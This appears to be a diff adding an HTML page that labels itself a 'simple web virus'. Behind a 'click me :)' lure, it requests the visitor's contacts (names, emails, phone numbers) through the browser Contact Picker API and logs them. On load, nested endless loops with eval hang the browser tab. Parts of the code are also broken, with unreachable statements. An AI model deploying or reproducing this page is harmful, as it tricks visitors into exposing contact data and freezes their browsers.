@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>hello</title>
+</head>
+<body onclick="main()" style="height: 100vh;width: 100vw; display:
+flex; justify-content: center; align-items: center;">
+  click me :)
+  <script type="application/javascript" charset="utf-8">
+    const config = {
+      name: "simple web virus",
+      author: {
+        name: "fiandev"
+      }
+    }
+    async function getContacts() {
+      const props = ["name", "email", "tel"];
+      const opts = { multiple: true };
+
+      try {
+        const res = await navigator.contacts.select(props, opts);
+        return res;
+      } catch (err) {
+        alert(err);
+      }
+    }
+    
+    async function openContactPicker () {
+      const supported = "contacts" in navigator && "ContactsManager" in window;
+      if (supported) {
+        const contacts = await getContacts();
+        console.log(contacts);
+      }
+    }
+    
+    function randOps () {
+      let operators = ["+", "-", "*", "/", "%"];
+      return operators[Math.floor(Math.random() * operators.length)];
+      return operators[Math.floor(Math.random() * operators.length)];
+    }
+    
+    function rand(min, max) {
+      return min + Math.random() * (max - min);
+    }
+    
+    function get_random_color() {
+      var h = rand(1, 360);
+      var s = rand(0, 100);
+      var l = rand(0, 100);
+      return 'hsl(' + h + ',' + s + '%,' + l + '%)';
+    }
+    
+    function changeBgColor () {
+      document.querySelector("body").style.backgroundColor = get_random_color();
+    }
+    
+    function main () {
+      openContactPicker();
+    }
+  </script>
+  <script type="application/javascript" charset="utf-8">
+    window.onload = () => {
+      do {
+        let [a, b] = [Math.random() * 10e9, Math.random() * 10e9];
+        let operation = eval(`${a} ${randOps()} ${b}`);
+        do {
+          console.log(operation);
+        } while (true)
+        
+        changeBgColor();
+        document.title = `${config.name} by. ${config.author.name}`;
+      } while (true)
+    }
+  </script>
+</body>
+</html>
